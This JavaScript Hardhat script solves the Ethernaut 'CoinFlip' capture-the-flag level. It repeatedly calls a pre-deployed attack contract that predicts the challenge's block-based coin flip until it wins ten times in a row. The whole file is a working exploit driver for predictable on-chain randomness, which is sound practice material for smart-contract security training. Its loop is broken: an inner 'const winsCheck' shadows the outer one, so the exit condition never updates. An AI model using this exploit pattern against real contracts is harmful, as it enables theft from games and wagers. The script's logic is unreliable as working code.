import { Wallet } from "ethers";
import { ethers } from "hardhat";

const attackCoinFlip = async () => {
    // IF THIS FAIL BEFORE REACHING 10 WINS, JUST RERUN UNTIL IT DOES !!!
    // change contract addresses here.
    const coinFlipAddress = "0xc643a90480bE7c733d8182B8A6d2B3B2074a8402"; //type "await contract.address()" in ethernaut console
    // attackCoinFlip address = "0xBa456e44a97609837fa1f2684539A8CDFf03F7db";

    // Don't touch below 🚀
    // Vulnerability from it being predictable
    // additional read:
    // https://ethereum.org/en/developers/docs/blocks/
    // https://solidity-by-example.org/interface/
    // typing all commands in console below
    // DON't FORGET TO DEPLOY 'AttackCoinFlip.sol' first before running this script !!!

    const attack = await ethers.getContract("AttackCoinFlip");
    const contract = await ethers.getContractAt("CoinFlip", coinFlipAddress);
    console.log("Checking consecutive wins, it should be zero...");
    const winsCheck = await contract.consecutiveWins();
    console.log(`Consecutive win is: ${winsCheck}`);
    console.log("Rigging game by predicting result with the attack contract...");
    // TODO: check for lastHash via blockhash and block.number
    while (winsCheck < 10) {
        const checkWin = (await contract.consecutiveWins()).toString();
        console.log(`Current consecutiveWin is: ${checkWin}`);
        const tx = await attack.guess(coinFlipAddress);
        const txReceipt = await tx.wait(2);
        console.log("Transaction done, aiming for '10' wins...");
        const winsCheck = await contract.consecutiveWins();
    }
    console.log("10 wins achieved, you may submit to ethernaut");
};

attackCoinFlip()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
